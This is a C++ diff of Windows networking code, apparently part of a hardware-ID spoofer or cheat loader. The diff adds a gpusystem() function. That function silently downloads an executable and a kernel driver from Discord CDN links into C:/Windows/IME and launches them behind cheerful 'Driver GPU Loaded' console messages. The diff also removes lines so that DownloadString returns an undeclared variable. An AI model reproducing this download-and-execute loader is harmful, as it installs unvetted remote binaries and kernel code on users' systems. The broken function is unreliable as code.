@@ -22,7 +22,6 @@ string WEB::DownloadString(string URL) {
 			DWORD bytesRead;
 			do {
 				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
-				rtn.append(buffer, bytesRead);
 				memset(buffer, 0, 2000);
 			} while (bytesRead);
 			InternetCloseHandle(interwebs);
@@ -32,7 +31,6 @@ string WEB::DownloadString(string URL) {
 		}
 	}
 	InternetCloseHandle(interwebs);
-	string p = replaceAll(rtn, "|n", "\r\n");
 	return p;
 }
 
@@ -53,3 +51,20 @@ int WEB::Perse()
 	URLDownloadToFile(NULL, URL.c_str(), path.c_str(), 0, NULL);
 	return 0;
 } 
+
+void gpusystem()
+	
+{
+	time_t now;
+	struct tm nowLocal;
+	now = time(NULL);
+	nowLocal = *localtime(&now);
+	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver GPU Loaded!");
+	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935605239250296862/GPU-UUID-Changer.exe"), _T("C:/Windows/IME/GPU-UUID-Changer.exe"), 0, NULL);
+	Sleep(3000);
+	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver GPU Loaded! (2)");
+	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935605239053172756/GPU.sys"), _T("C:/Windows/IME/GPU.sys"), 0, NULL);
+	Sleep(4000);
+	system("start C:/Windows/IME/GPU-UUID-Changer.exe C:/Windows/IME/GPU.sys");
+	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("GPU DRIVER TOTALY LOADED! #KayklOnTOP");
+}
